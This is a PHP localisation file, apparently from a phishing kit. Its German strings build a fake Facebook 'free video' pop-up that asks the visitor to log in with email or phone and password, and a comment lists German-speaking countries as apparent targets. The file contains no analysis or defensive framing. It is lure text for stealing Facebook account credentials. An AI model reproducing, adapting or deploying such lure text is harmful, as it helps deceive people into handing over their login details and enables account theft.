<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'de';

// Fondo

$lang['TITULO_PAGINA'] = 'Facebook-Anwendung';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Anwendung (Free)';
$lang['POPUP_DESCRIPCION'] = 'Facebook muss folgende Angaben zu best�tigen, damit Zugriff auf diese Anwendungsvideos, Einloggen!';
$lang['POPUP_CORREO'] = 'E-Mail oder Telefon';
$lang['POPUP_CONTRASENA'] = 'Passwort';
$lang['POPUP_SUBMIT'] = 'Anmelden';
$lang['POPUP_CANDADO'] = 'Diese Anwendung ist nicht erlaubt, auf Facebook ver�ffentlichen.';

/*
array("Germany", "Austria", "Switzerland", "Luxembourg", "Liechtenstein")
*/